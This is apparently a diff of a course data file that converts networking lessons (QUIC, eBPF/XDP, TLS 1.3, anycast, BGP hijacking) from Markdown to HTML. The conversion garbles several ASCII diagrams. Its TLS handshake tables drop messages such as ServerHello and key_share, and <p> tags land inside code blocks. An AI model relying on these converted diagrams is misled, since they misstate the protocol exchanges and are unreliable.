+<li><strong>2014</strong> — Google silently routes Chrome → Google services over QUIC</li>
+<li>By 2015, <strong>~50% of Chrome-to-Google traffic</strong> used QUIC</li>
+<li>Most users had no idea they were using a new protocol</li>
+</ul>
 
-**Why no one noticed:**
-- QUIC uses UDP port 443 — firewalls already allow it
-- If QUIC fails, Chrome falls back to TCP automatically
-- Pages loaded faster — users just thought "Google is fast"
-- No installation, no configuration, no user action needed
+<p><strong>Why no one noticed:</strong></p>
+<ul>
+<li>QUIC uses UDP port 443 — firewalls already allow it</li>
+<li>If QUIC fails, Chrome falls back to TCP automatically</li>
+<li>Pages loaded faster — users just thought "Google is fast"</li>
+<li>No installation, no configuration, no user action needed</li>
+</ul>
 
-**The results:**
-- Search: 8% faster page loads
-- YouTube: 15% fewer rebuffers (buffering events)
-- On lossy mobile networks: 30% faster than TCP
-- Google proved QUIC worked at scale with billions of users
+<p><strong>The results:</strong></p>
+<ul>
+<li>Search: 8% faster page loads</li>
+<li>YouTube: 15% fewer rebuffers (buffering events)</li>
+<li>On lossy mobile networks: 30% faster than TCP</li>
+<li>Google proved QUIC worked at scale with billions of users</li>
+</ul>
 
-**From Google experiment to internet standard:**
-- **2016** — IETF starts standardizing QUIC (based on Google's design)
-- **2021** — RFC 9000: QUIC is an official internet standard
-- **2022** — RFC 9114: HTTP/3 (HTTP over QUIC) is standardized
-- Today: ~30% of all web traffic uses QUIC/HTTP3
+<p><strong>From Google experiment to internet standard:</strong></p>
+<ul>
+<li><strong>2016</strong> — IETF starts standardizing QUIC (based on Google's design)</li>
+<li><strong>2021</strong> — RFC 9000: QUIC is an official internet standard</li>
+<li><strong>2022</strong> — RFC 9114: HTTP/3 (HTTP over QUIC) is standardized</li>
+<li>Today: ~30% of all web traffic uses QUIC/HTTP3</li>
+</ul>
 
-**Lesson:** Sometimes the best way to change the internet is to ship it inside a browser update and let users discover the speed improvement on their own.
+<p><strong>Lesson:</strong> Sometimes the best way to change the internet is to ship it inside a browser update and let users discover the speed improvement on their own.</p>
 
 {thinkOutside}
-QUIC runs over UDP. Many corporate firewalls block all UDP except DNS (port 53). How would you handle deploying HTTP/3 in an enterprise environment where UDP 443 might be blocked?`
+<p>QUIC runs over UDP. Many corporate firewalls block all UDP except DNS (port 53). How would you handle deploying HTTP/3 in an enterprise environment where UDP 443 might be blocked?</p>`
       }
     ]
   },
@@ -7452,141 +8192,165 @@ QUIC runs over UDP. Many corporate firewalls block all UDP except DNS (port 53).
     pages: [
       {
         titleEn: "What is eBPF?",
-        contentEn: `**eBPF (extended Berkeley Packet Filter)** lets you run custom programs inside the Linux kernel — safely, without modifying kernel code.
+        contentEn: `<p><strong>eBPF (extended Berkeley Packet Filter)</strong> lets you run custom programs inside the Linux kernel — safely, without modifying kernel code.</p>
 
-**The problem eBPF solves:**
-- Want to add a firewall rule? Modify kernel module → recompile → reboot
-- Want to trace a function? Load a kernel module → risk crashing the system
-- Want custom networking? Write kernel code → wait years for it to ship in a distro
+<p><strong>The problem eBPF solves:</strong></p>
+<ul>
+<li>Want to add a firewall rule? Modify kernel module → recompile → reboot</li>
+<li>Want to trace a function? Load a kernel module → risk crashing the system</li>
+<li>Want custom networking? Write kernel code → wait years for it to ship in a distro</li>
+</ul>
 
-**eBPF approach:**
-- Write a small program in C (or Rust)
-- Compile it to eBPF bytecode
-- Load it into the kernel at runtime — no reboot, no kernel rebuild
+<p><strong>eBPF approach:</strong></p>
+<ul>
+<li>Write a small program in C (or Rust)</li>
+<li>Compile it to eBPF bytecode</li>
+<li>Load it into the kernel at runtime — no reboot, no kernel rebuild</li>
+</ul>
 
-**The safety model — Verifier + JIT:**
+<p><strong>The safety model — Verifier + JIT:</strong></p>
 
-\`\`\`
-Your eBPF program
-       ↓
-   [Verifier] — checks BEFORE loading:
-   ✓ No infinite loops (bounded loops only)
-   ✓ No out-of-bounds memory access
-   ✓ No null pointer dereference
-   ✓ Program terminates (max instruction count)
-   ✓ Only allowed kernel functions (helpers)
-       ↓
-   [JIT Compiler] — converts bytecode to native machine code
-       ↓
-   Runs at kernel speed (not interpreted)
-\`\`\`
+<pre><code>Your eBPF program
+<p>↓</p>
+<p>[Verifier] — checks BEFORE loading:</p>
+<p>✓ No infinite loops (bounded loops only)</p>
+<p>✓ No out-of-bounds memory access</p>
+<p>✓ No null pointer dereference</p>
+<p>✓ Program terminates (max instruction count)</p>
+<p>✓ Only allowed kernel functions (helpers)</p>
+<p>↓</p>
+<p>[JIT Compiler] — converts bytecode to native machine code</p>
+<p>↓</p>
+<p>Runs at kernel speed (not interpreted)</p>
+</code></pre>
 
-**Where can eBPF programs attach?**
-- **Network** — XDP (packet arrives at NIC), TC (traffic control), socket
-- **Tracing** — kprobes (any kernel function), tracepoints, uprobes (userspace)
-- **Security** — LSM hooks (file access, process execution)
-- **Scheduling** — CPU scheduler (Linux 6.6+)
+<p><strong>Where can eBPF programs attach?</strong></p>
+<ul>
+<li><strong>Network</strong> — XDP (packet arrives at NIC), TC (traffic control), socket</li>
+<li><strong>Tracing</strong> — kprobes (any kernel function), tracepoints, uprobes (userspace)</li>
+<li><strong>Security</strong> — LSM hooks (file access, process execution)</li>
+<li><strong>Scheduling</strong> — CPU scheduler (Linux 6.6+)</li>
+</ul>
 
-**eBPF Maps — shared data:**
-- Key-value stores shared between eBPF programs and userspace
-- Types: hash map, array, ring buffer, LRU cache, per-CPU arrays
-- Example: count packets per IP → eBPF program updates map → userspace reads map`
+<p><strong>eBPF Maps — shared data:</strong></p>
+<ul>
+<li>Key-value stores shared between eBPF programs and userspace</li>
+<li>Types: hash map, array, ring buffer, LRU cache, per-CPU arrays</li>
+<li>Example: count packets per IP → eBPF program updates map → userspace reads map</li>
+</ul>`
       },
       {
         titleEn: "XDP and Cilium — Real Use Cases",
-        contentEn: `**XDP (eXpress Data Path)** — process packets at the earliest possible point.
+        contentEn: `<p><strong>XDP (eXpress Data Path)</strong> — process packets at the earliest possible point.</p>
 
-**How XDP works:**
-\`\`\`
-Packet arrives at NIC
-       ↓
-   [XDP program runs HERE] ← before kernel networking stack
-       ↓
-   Decision:
-   XDP_PASS  → continue to kernel stack (normal processing)
-   XDP_DROP  → drop packet immediately (never enters kernel)
-   XDP_TX    → send packet back out same NIC (bounce)
-   XDP_REDIRECT → send to different NIC or CPU
-\`\`\`
+<p><strong>How XDP works:</strong></p>
+<pre><code>Packet arrives at NIC
+<p>↓</p>
+<p>[XDP program runs HERE] ← before kernel networking stack</p>
+<p>↓</p>
+<p>Decision:</p>
+<p>XDP_PASS  → continue to kernel stack (normal processing)</p>
+<p>XDP_DROP  → drop packet immediately (never enters kernel)</p>
+<p>XDP_TX    → send packet back out same NIC (bounce)</p>
+<p>XDP_REDIRECT → send to different NIC or CPU</p>
+</code></pre>
 
-**Why XDP is so fast:**
-- Runs before memory allocation for the packet (no sk_buff)
-- Runs before any kernel networking code
-- Can process **millions of packets per second per CPU core**
-- 10x faster than iptables for packet filtering
+<p><strong>Why XDP is so fast:</strong></p>
+<ul>
+<li>Runs before memory allocation for the packet (no sk_buff)</li>
+<li>Runs before any kernel networking code</li>
+<li>Can process <strong>millions of packets per second per CPU core</strong></li>
+<li>10x faster than iptables for packet filtering</li>
+</ul>
 
-**Cilium — Kubernetes networking with eBPF:**
+<p><strong>Cilium — Kubernetes networking with eBPF:</strong></p>
 
-Traditional K8s networking:
-\`\`\`
-Pod A → veth → bridge → iptables (100s of rules) → bridge → veth → Pod B
-\`\`\`
+<p>Traditional K8s networking:</p>
+<pre><code>Pod A → veth → bridge → iptables (100s of rules) → bridge → veth → Pod B
+</code></pre>
 
-Cilium with eBPF:
-\`\`\`
-Pod A → eBPF program → Pod B  (direct, no iptables)
-\`\`\`
+<p>Cilium with eBPF:</p>
+<pre><code>Pod A → eBPF program → Pod B  (direct, no iptables)
+</code></pre>
 
-**What Cilium provides:**
-- **Networking** — pod-to-pod, service load balancing (replaces kube-proxy)
-- **Security** — L3/L4/L7 network policies (can filter by HTTP path!)
-- **Observability** — Hubble: network flow logs without sidecar proxies
-- **Encryption** — transparent WireGuard encryption between nodes
+<p><strong>What Cilium provides:</strong></p>
+<ul>
+<li><strong>Networking</strong> — pod-to-pod, service load balancing (replaces kube-proxy)</li>
+<li><strong>Security</strong> — L3/L4/L7 network policies (can filter by HTTP path!)</li>
+<li><strong>Observability</strong> — Hubble: network flow logs without sidecar proxies</li>
+<li><strong>Encryption</strong> — transparent WireGuard encryption between nodes</li>
+</ul>
 
-**The iptables problem Cilium solves:**
-- 1000 Kubernetes services = ~20,000 iptables rules
-- iptables is O(n) — checks rules one by one
-- eBPF hash maps are O(1) — direct lookup
-- At scale: 10x–100x faster than iptables`
+<p><strong>The iptables problem Cilium solves:</strong></p>
+<ul>
+<li>1000 Kubernetes services = ~20,000 iptables rules</li>
+<li>iptables is O(n) — checks rules one by one</li>
+<li>eBPF hash maps are O(1) — direct lookup</li>
+<li>At scale: 10x–100x faster than iptables</li>
+</ul>`
       },
       {
         titleEn: "Story: Cloudflare Stops 800 Gbps DDoS with eBPF",
         contentEn: `{story}
 
-**How Cloudflare Uses eBPF to Block Massive DDoS Attacks**
+<p><strong>How Cloudflare Uses eBPF to Block Massive DDoS Attacks</strong></p>
 
-Cloudflare handles some of the largest DDoS attacks in history. Their secret weapon? XDP + eBPF.
+<p>Cloudflare handles some of the largest DDoS attacks in history. Their secret weapon? XDP + eBPF.</p>
 
-**The challenge:**
-- DDoS attacks can be 500 Gbps – 2+ Tbps
-- Traditional firewalls can't process packets fast enough
-- iptables at this scale = 100% CPU usage = server dies
-- You need to drop bad packets BEFORE they consume resources
+<p><strong>The challenge:</strong></p>
+<ul>
+<li>DDoS attacks can be 500 Gbps – 2+ Tbps</li>
+<li>Traditional firewalls can't process packets fast enough</li>
+<li>iptables at this scale = 100% CPU usage = server dies</li>
+<li>You need to drop bad packets BEFORE they consume resources</li>
+</ul>
 
-**Cloudflare's architecture:**
-1. **XDP programs** run at the NIC driver level
-2. Each packet is checked against eBPF maps containing attack signatures
-3. Bad packets are dropped with XDP_DROP — never enter the kernel
-4. Good packets pass through to the application
-5. Attack patterns are updated in real-time (no restart needed)
+<p><strong>Cloudflare's architecture:</strong></p>
+<ol>
+<li><strong>XDP programs</strong> run at the NIC driver level</li>
+<li>Each packet is checked against eBPF maps containing attack signatures</li>
+<li>Bad packets are dropped with XDP_DROP — never enter the kernel</li>
+<li>Good packets pass through to the application</li>
+<li>Attack patterns are updated in real-time (no restart needed)</li>
+</ol>
 
-**Real incident — 800 Gbps attack:**
-- Attack: UDP flood from ~300,000 source IPs
-- XDP program checked each packet against a Bloom filter in eBPF map
-- Dropped 99.7% of attack traffic at line speed
-- Server CPU stayed under 10%
-- Legitimate users noticed nothing
+<p><strong>Real incident — 800 Gbps attack:</strong></p>
+<ul>
+<li>Attack: UDP flood from ~300,000 source IPs</li>
+<li>XDP program checked each packet against a Bloom filter in eBPF map</li>
+<li>Dropped 99.7% of attack traffic at line speed</li>
+<li>Server CPU stayed under 10%</li>
+<li>Legitimate users noticed nothing</li>
+</ul>
 
-**Why eBPF was the right tool:**
-- **Speed** — XDP processes before kernel allocates memory for the packet
-- **Flexibility** — update attack rules without restarting anything
-- **Safety** — verifier ensures eBPF programs can't crash the kernel
-- **Programmable** — can match complex patterns (not just IP/port)
+<p><strong>Why eBPF was the right tool:</strong></p>
+<ul>
+<li><strong>Speed</strong> — XDP processes before kernel allocates memory for the packet</li>
+<li><strong>Flexibility</strong> — update attack rules without restarting anything</li>
+<li><strong>Safety</strong> — verifier ensures eBPF programs can't crash the kernel</li>
+<li><strong>Programmable</strong> — can match complex patterns (not just IP/port)</li>
+</ul>
 
-**Their tool: xdpcap**
-- Like tcpdump but for XDP
-- Captures packets that XDP programs are dropping
-- Useful for debugging: "why is this packet being dropped?"
+<p><strong>Their tool: xdpcap</strong></p>
+<ul>
+<li>Like tcpdump but for XDP</li>
+<li>Captures packets that XDP programs are dropping</li>
+<li>Useful for debugging: "why is this packet being dropped?"</li>
+</ul>
 
-**Scale:**
-- Cloudflare runs eBPF on every server in 300+ data centers
-- Each server can drop 10M+ packets/second with XDP
-- Combined capacity: can absorb multi-Tbps attacks
+<p><strong>Scale:</strong></p>
+<ul>
+<li>Cloudflare runs eBPF on every server in 300+ data centers</li>
+<li>Each server can drop 10M+ packets/second with XDP</li>
+<li>Combined capacity: can absorb multi-Tbps attacks</li>
+</ul>
 
 {questions}
-1. Why is XDP faster than iptables for dropping packets?
-2. What is the role of the eBPF verifier? Why is it critical for security?
-3. A company uses 5000 iptables rules for firewall. How would migrating to eBPF improve performance?`
+<ol>
+<li>Why is XDP faster than iptables for dropping packets?</li>
+<li>What is the role of the eBPF verifier? Why is it critical for security?</li>
+<li>A company uses 5000 iptables rules for firewall. How would migrating to eBPF improve performance?</li>
+</ol>`
       }
     ]
   },
@@ -7596,154 +8360,186 @@ Cloudflare handles some of the largest DDoS attacks in history. Their secret wea
     pages: [
       {
         titleEn: "TLS 1.2 vs 1.3 — What Changed",
-        contentEn: `**TLS 1.3 (RFC 8446, 2018) removed everything that was broken or slow in TLS 1.2.**
+        contentEn: `<p><strong>TLS 1.3 (RFC 8446, 2018) removed everything that was broken or slow in TLS 1.2.</strong></p>
 
-**Removed from TLS 1.3:**
-- RSA key exchange (no forward secrecy)
-- CBC mode ciphers (BEAST, Lucky13 attacks)
-- RC4, DES, 3DES (weak ciphers)
-- SHA-1 (broken hash)
-- Compression (CRIME attack)
-- Renegotiation (complexity, attack surface)
-- Custom DHE groups (weak parameters possible)
-- Static RSA/DH (no forward secrecy)
-- ChangeCipherSpec message (unnecessary)
+<p><strong>Removed from TLS 1.3:</strong></p>
+<ul>
+<li>RSA key exchange (no forward secrecy)</li>
+<li>CBC mode ciphers (BEAST, Lucky13 attacks)</li>
+<li>RC4, DES, 3DES (weak ciphers)</li>
+<li>SHA-1 (broken hash)</li>
+<li>Compression (CRIME attack)</li>
+<li>Renegotiation (complexity, attack surface)</li>
+<li>Custom DHE groups (weak parameters possible)</li>
+<li>Static RSA/DH (no forward secrecy)</li>
+<li>ChangeCipherSpec message (unnecessary)</li>
+</ul>
 
-**TLS 1.2 had ~37 cipher suites. TLS 1.3 has only 5:**
+<p><strong>TLS 1.2 had ~37 cipher suites. TLS 1.3 has only 5:</strong></p>
 
-| Cipher Suite | Encryption | Hash |
-|---|---|---|
-| TLS_AES_256_GCM_SHA384 | AES-256-GCM | SHA-384 |
-| TLS_AES_128_GCM_SHA256 | AES-128-GCM | SHA-256 |
-| TLS_CHACHA20_POLY1305_SHA256 | ChaCha20-Poly1305 | SHA-256 |
-| TLS_AES_128_CCM_SHA256 | AES-128-CCM | SHA-256 |
-| TLS_AES_128_CCM_8_SHA256 | AES-128-CCM-8 | SHA-256 |
+<table>
+<thead><tr><th>Cipher Suite</th><th>Encryption</th><th>Hash</th></tr></thead>
+<tbody>
+<tr><td>TLS_AES_256_GCM_SHA384</td><td>AES-256-GCM</td><td>SHA-384</td></tr>
+<tr><td>TLS_AES_128_GCM_SHA256</td><td>AES-128-GCM</td><td>SHA-256</td></tr>
+<tr><td>TLS_CHACHA20_POLY1305_SHA256</td><td>ChaCha20-Poly1305</td><td>SHA-256</td></tr>
+<tr><td>TLS_AES_128_CCM_SHA256</td><td>AES-128-CCM</td><td>SHA-256</td></tr>
+<tr><td>TLS_AES_128_CCM_8_SHA256</td><td>AES-128-CCM-8</td><td>SHA-256</td></tr>
+</tbody></table>
 
-**Key differences:**
-- All TLS 1.3 ciphers use **AEAD** (Authenticated Encryption with Associated Data)
-- Key exchange is ALWAYS Diffie-Hellman (ECDHE or DHE) — RSA key exchange removed
-- This means **forward secrecy is mandatory** — not optional like in TLS 1.2
-- Fewer choices = fewer configuration mistakes = more secure by default
+<p><strong>Key differences:</strong></p>
+<ul>
+<li>All TLS 1.3 ciphers use <strong>AEAD</strong> (Authenticated Encryption with Associated Data)</li>
+<li>Key exchange is ALWAYS Diffie-Hellman (ECDHE or DHE) — RSA key exchange removed</li>
+<li>This means <strong>forward secrecy is mandatory</strong> — not optional like in TLS 1.2</li>
+<li>Fewer choices = fewer configuration mistakes = more secure by default</li>
+</ul>
 
-**Why removing RSA key exchange matters:**
-- TLS 1.2 with RSA: server's private key decrypts ALL past sessions
-- Steal the key → decrypt years of recorded traffic
-- TLS 1.3 with ECDHE: each session has unique keys
-- Steal the key → can't decrypt past sessions (forward secrecy)`
+<p><strong>Why removing RSA key exchange matters:</strong></p>
+<ul>
+<li>TLS 1.2 with RSA: server's private key decrypts ALL past sessions</li>
+<li>Steal the key → decrypt years of recorded traffic</li>
+<li>TLS 1.3 with ECDHE: each session has unique keys</li>
+<li>Steal the key → can't decrypt past sessions (forward secrecy)</li>
+</ul>`
       },
       {
         titleEn: "1-RTT Handshake — How It Works",
-        contentEn: `**TLS 1.3 combines the TLS and key exchange into a single round trip.**
+        contentEn: `<p><strong>TLS 1.3 combines the TLS and key exchange into a single round trip.</strong></p>
 
-**TLS 1.2 Handshake (2-RTT):**
-\`\`\`
-Client                              Server
-  |--- ClientHello ------------------->|  RTT 1
-  |<-- ServerHello + Certificate ------|
-  |--- Key Exchange + Finished ------->|  RTT 2
-  |<-- Finished -----------------------|
-  |--- Application Data ------------->|  RTT 3 (first data!)
-\`\`\`
+<p><strong>TLS 1.2 Handshake (2-RTT):</strong></p>
+<pre><code>Client                              Server
+<table>
+<thead><tr><th>--- ClientHello -------------------></th><th>RTT 1</th></tr></thead>
+<tbody>
+<tr><td>--- Key Exchange + Finished -------></td><td>RTT 2</td></tr>
+<tr><td><-- Finished -----------------------</td></tr>
+<tr><td>--- Application Data -------------></td><td>RTT 3 (first data!)</td></tr>
+</tbody></table>
+</code></pre>
 
-**TLS 1.3 Handshake (1-RTT):**
-\`\`\`
-Client                              Server
-  |--- ClientHello ------------------>|
-  |    + key_share (ECDHE public key) |
-  |    + supported_versions (1.3)     |  RTT 1
-  |<-- ServerHello -------------------|
-  |    + key_share (ECDHE public key) |
-  |    + {Certificate}               |
-  |    + {CertificateVerify}         |
-  |    + {Finished}                  |
-  |--- {Finished} ------------------->|
-  |--- Application Data ------------>|  RTT 1 (first data!)
-\`\`\`
-{} = encrypted
+<p><strong>TLS 1.3 Handshake (1-RTT):</strong></p>
+<pre><code>Client                              Server
+<table>
+<thead><tr><th>--- ClientHello ------------------></th></tr></thead>
+<tbody>
+<tr><td>+ supported_versions (1.3)</td><td>RTT 1</td></tr>
+<tr><td><-- ServerHello -------------------</td></tr>
+<tr><td>+ key_share (ECDHE public key)</td></tr>
+<tr><td>+ {Certificate}</td></tr>
+<tr><td>+ {CertificateVerify}</td></tr>
+<tr><td>+ {Finished}</td></tr>
+<tr><td>--- {Finished} -------------------></td></tr>
+<tr><td>--- Application Data ------------></td><td>RTT 1 (first data!)</td></tr>
+</tbody></table>
+</code></pre>
+<p>{} = encrypted</p>
 
-**Why it's faster:**
-- Client sends its ECDHE key share in the FIRST message (guesses the curve)
-- Server responds with everything at once: its key, certificate, and finished
-- Both sides can compute the shared secret after 1 round trip
-- Application data can flow immediately after
+<p><strong>Why it's faster:</strong></p>
+<ul>
+<li>Client sends its ECDHE key share in the FIRST message (guesses the curve)</li>
+<li>Server responds with everything at once: its key, certificate, and finished</li>
+<li>Both sides can compute the shared secret after 1 round trip</li>
+<li>Application data can flow immediately after</li>
+</ul>
 
-**ECDHE (Elliptic Curve Diffie-Hellman Ephemeral):**
-- Client generates random private key → computes public key on the curve
-- Server generates random private key → computes public key on the curve
-- Both compute the same shared secret (math magic of elliptic curves)
-- **Ephemeral** = new keys every session → forward secrecy
-- Common curves: X25519 (fast, safe), P-256 (widely supported)`
+<p><strong>ECDHE (Elliptic Curve Diffie-Hellman Ephemeral):</strong></p>
+<ul>
+<li>Client generates random private key → computes public key on the curve</li>
+<li>Server generates random private key → computes public key on the curve</li>
+<li>Both compute the same shared secret (math magic of elliptic curves)</li>
+<li><strong>Ephemeral</strong> = new keys every session → forward secrecy</li>
+<li>Common curves: X25519 (fast, safe), P-256 (widely supported)</li>
+</ul>`
       },
       {
         titleEn: "Forward Secrecy and 0-RTT Resumption",
-        contentEn: `**Forward secrecy means: compromise today doesn't reveal yesterday.**
+        contentEn: `<p><strong>Forward secrecy means: compromise today doesn't reveal yesterday.</strong></p>
 
-**How forward secrecy works in TLS 1.3:**
-\`\`\`
-Session 1: Client key = random_A, Server key = random_B → shared secret_1
-Session 2: Client key = random_C, Server key = random_D → shared secret_2
-Session 3: Client key = random_E, Server key = random_F → shared secret_3
+<p><strong>How forward secrecy works in TLS 1.3:</strong></p>
+<pre><code>Session 1: Client key = random_A, Server key = random_B → shared secret_1
+<p>Session 2: Client key = random_C, Server key = random_D → shared secret_2</p>
+<p>Session 3: Client key = random_E, Server key = random_F → shared secret_3</p>
 
-Each session uses NEW random keys.
-Crack session 2? You only get session 2's data.
-Sessions 1 and 3 are safe.
-\`\`\`
+<p>Each session uses NEW random keys.</p>
+<p>Crack session 2? You only get session 2's data.</p>
+<p>Sessions 1 and 3 are safe.</p>
+</code></pre>
 
-**0-RTT Resumption (PSK):**
-- After a successful TLS 1.3 handshake, server sends a **session ticket**
-- Next connection: client sends the ticket + application data in the FIRST packet
-- Server decrypts and responds immediately — **zero round trips** of latency
+<p><strong>0-RTT Resumption (PSK):</strong></p>
+<ul>
+<li>After a successful TLS 1.3 handshake, server sends a <strong>session ticket</strong></li>
+<li>Next connection: client sends the ticket + application data in the FIRST packet</li>
+<li>Server decrypts and responds immediately — <strong>zero round trips</strong> of latency</li>
+</ul>
 
-\`\`\`
-Client                              Server
-  |--- ClientHello ------------------>|
-  |    + pre_shared_key (ticket)      |
-  |    + early_data (0-RTT)           |  0 RTT — data sent immediately!
-  |<-- ServerHello + Finished --------|
-  |--- Finished --------------------->|
-\`\`\`
+<pre><code>Client                              Server
+<table>
+<thead><tr><th>--- ClientHello ------------------></th></tr></thead>
+<tbody>
+<tr><td>+ early_data (0-RTT)</td><td>0 RTT — data sent immediately!</td></tr>
+<tr><td><-- ServerHello + Finished --------</td></tr>
+<tr><td>--- Finished ---------------------></td></tr>
+</tbody></table>
+</code></pre>
 
-**The 0-RTT security tradeoff:**
-- 0-RTT data is **replayable** — an attacker can capture and resend it
-- Safe for: GET requests (reading data)
-- Dangerous for: POST requests (creating orders, transferring money)
-- Servers must implement **anti-replay** mechanisms
-- Many servers disable 0-RTT for non-idempotent requests
+<p><strong>The 0-RTT security tradeoff:</strong></p>
+<ul>
+<li>0-RTT data is <strong>replayable</strong> — an attacker can capture and resend it</li>
+<li>Safe for: GET requests (reading data)</li>
+<li>Dangerous for: POST requests (creating orders, transferring money)</li>
+<li>Servers must implement <strong>anti-replay</strong> mechanisms</li>
+<li>Many servers disable 0-RTT for non-idempotent requests</li>
+</ul>
 
-**Practical impact:**
-- TLS 1.2 → 1.3: saves ~100ms on first connection (one less RTT)
-- 0-RTT resumption: saves ~200ms on repeat connections
-- On mobile networks (150ms RTT): this is very noticeable`
+<p><strong>Practical impact:</strong></p>
+<ul>
+<li>TLS 1.2 → 1.3: saves ~100ms on first connection (one less RTT)</li>
+<li>0-RTT resumption: saves ~200ms on repeat connections</li>
+<li>On mobile networks (150ms RTT): this is very noticeable</li>
+</ul>`
       },
       {
         titleEn: "Practice — TLS 1.3 Deep Dive",
         contentEn: `{questions}
 
-**Concept check:**
+<p><strong>Concept check:</strong></p>
 
-1. TLS 1.2 allowed RSA key exchange. TLS 1.3 removed it. Explain why in terms of forward secrecy.
+<ol>
+<li>TLS 1.2 allowed RSA key exchange. TLS 1.3 removed it. Explain why in terms of forward secrecy.</li>
+</ol>
 
-2. TLS 1.3 has only 5 cipher suites, while TLS 1.2 had ~37. Why is fewer actually more secure?
+<ol>
+<li>TLS 1.3 has only 5 cipher suites, while TLS 1.2 had ~37. Why is fewer actually more secure?</li>
+</ol>
 
-3. Draw the TLS 1.3 1-RTT handshake from memory. Mark which messages are encrypted.
+<ol>
+<li>Draw the TLS 1.3 1-RTT handshake from memory. Mark which messages are encrypted.</li>
+</ol>
 
-4. A banking website enables 0-RTT resumption for all requests. What is the security risk? What kind of requests should NOT use 0-RTT?
+<ol>
+<li>A banking website enables 0-RTT resumption for all requests. What is the security risk? What kind of requests should NOT use 0-RTT?</li>
+</ol>
 
-5. Explain ECDHE in simple terms: why does "ephemeral" matter?
+<ol>
+<li>Explain ECDHE in simple terms: why does "ephemeral" matter?</li>
+</ol>
 
 {simulation}
 
-**Scenario:** You are a security engineer. Your company's web server supports both TLS 1.2 and TLS 1.3. The CEO asks: "Why should we disable TLS 1.2? Everything works fine."
+<p><strong>Scenario:</strong> You are a security engineer. Your company's web server supports both TLS 1.2 and TLS 1.3. The CEO asks: "Why should we disable TLS 1.2? Everything works fine."</p>
 
-Write a brief explanation covering:
-- What attacks are possible with TLS 1.2 that are impossible with TLS 1.3?
-- What is the performance benefit?
-- What might break if you disable TLS 1.2? (think about old clients)
-- What is your recommendation?
+<p>Write a brief explanation covering:</p>
+<ul>
+<li>What attacks are possible with TLS 1.2 that are impossible with TLS 1.3?</li>
+<li>What is the performance benefit?</li>
+<li>What might break if you disable TLS 1.2? (think about old clients)</li>
+<li>What is your recommendation?</li>
+</ul>
 
 {thinkOutside}
 
-An attacker records all encrypted TLS 1.3 traffic between a user and a bank for 5 years. Then they steal the server's private RSA key. Can they decrypt the recorded traffic? Why or why not? What if it was TLS 1.2 with RSA key exchange?`
+<p>An attacker records all encrypted TLS 1.3 traffic between a user and a bank for 5 years. Then they steal the server's private RSA key. Can they decrypt the recorded traffic? Why or why not? What if it was TLS 1.2 with RSA key exchange?</p>`
       }
     ]
   },
@@ -7753,123 +8549,144 @@ An attacker records all encrypted TLS 1.3 traffic between a user and a bank for 
     pages: [
       {
         titleEn: "Anycast Routing via BGP",
-        contentEn: `**Anycast = one IP address, many servers around the world. BGP picks the closest one.**
+        contentEn: `<p><strong>Anycast = one IP address, many servers around the world. BGP picks the closest one.</strong></p>
 
-**How it works:**
-\`\`\`
-Cloudflare DNS: 1.1.1.1
+<p><strong>How it works:</strong></p>
+<pre><code>Cloudflare DNS: 1.1.1.1
 
-Server in London announces via BGP: "I have route to 1.1.1.1"
-Server in Tokyo announces via BGP: "I have route to 1.1.1.1"
-Server in New York announces via BGP: "I have route to 1.1.1.1"
+<p>Server in London announces via BGP: "I have route to 1.1.1.1"</p>
+<p>Server in Tokyo announces via BGP: "I have route to 1.1.1.1"</p>
+<p>Server in New York announces via BGP: "I have route to 1.1.1.1"</p>
 
-User in Paris → BGP picks shortest AS path → routes to London
-User in Seoul → BGP picks shortest AS path → routes to Tokyo
-\`\`\`
+<p>User in Paris → BGP picks shortest AS path → routes to London</p>
+<p>User in Seoul → BGP picks shortest AS path → routes to Tokyo</p>
+</code></pre>
 
-**Why anycast works:**
-- BGP naturally routes to the "closest" announcement (shortest AS path)
-- No special protocol needed — just announce the same prefix from multiple locations
-- Users are automatically sent to the nearest server
+<p><strong>Why anycast works:</strong></p>
+<ul>
+<li>BGP naturally routes to the "closest" announcement (shortest AS path)</li>
+<li>No special protocol needed — just announce the same prefix from multiple locations</li>
+<li>Users are automatically sent to the nearest server</li>
+</ul>
 
-**Use cases:**
-- **DNS** — all root servers use anycast (13 addresses, 1000+ actual servers)
-- **CDN** — Cloudflare, AWS CloudFront, Google serve content via anycast
-- **DDoS protection** — attack traffic is spread across all locations
+<p><strong>Use cases:</strong></p>
+<ul>
+<li><strong>DNS</strong> — all root servers use anycast (13 addresses, 1000+ actual servers)</li>
+<li><strong>CDN</strong> — Cloudflare, AWS CloudFront, Google serve content via anycast</li>
+<li><strong>DDoS protection</strong> — attack traffic is spread across all locations</li>
+</ul>
 
-**Anycast + DDoS:**
-\`\`\`
-Without anycast:           With anycast:
-All attack traffic →       Attack traffic spread →
-[Single server] 💀         [London] 15% of attack
-                           [Tokyo] 10% of attack
-                           [NYC] 20% of attack
-                           [São Paulo] 15% of attack
-                           ... each location handles a small portion
-\`\`\`
+<p><strong>Anycast + DDoS:</strong></p>
+<pre><code>Without anycast:           With anycast:
+<p>All attack traffic →       Attack traffic spread →</p>
+<p>[Single server] 💀         [London] 15% of attack</p>
+<p>[Tokyo] 10% of attack</p>
+<p>[NYC] 20% of attack</p>
+<p>[São Paulo] 15% of attack</p>
+<p>... each location handles a small portion</p>
+</code></pre>
 
-**Limitations:**
-- Works great for UDP (DNS) — each packet is independent
-- TCP with anycast needs care — if BGP route changes mid-connection, packets go to a different server
-- Solutions: ECMP pinning, QUIC Connection ID, flow-aware load balancing`
+<p><strong>Limitations:</strong></p>
+<ul>
+<li>Works great for UDP (DNS) — each packet is independent</li>
+<li>TCP with anycast needs care — if BGP route changes mid-connection, packets go to a different server</li>
+<li>Solutions: ECMP pinning, QUIC Connection ID, flow-aware load balancing</li>
+</ul>`
       },
       {
         titleEn: "BGP Hijacking and RPKI Protection",
-        contentEn: `**BGP hijacking = announcing someone else's IP prefix as your own.**
+        contentEn: `<p><strong>BGP hijacking = announcing someone else's IP prefix as your own.</strong></p>
 
-**Types of BGP hijacking:**
+<p><strong>Types of BGP hijacking:</strong></p>
 
-| Type | Method | Effect |
-|---|---|---|
-| **Prefix hijack** | Announce exact same prefix | Traffic splits (some goes to attacker) |
-| **Sub-prefix hijack** | Announce more specific prefix (/25 vs /24) | All traffic goes to attacker (longest match wins) |
-| **AS path poisoning** | Fake shorter AS path | Traffic prefers attacker's "shorter" path |
-| **Route leak** | Accidentally share internal routes externally | Traffic takes wrong path |
+<table>
+<thead><tr><th>Type</th><th>Method</th><th>Effect</th></tr></thead>
+<tbody>
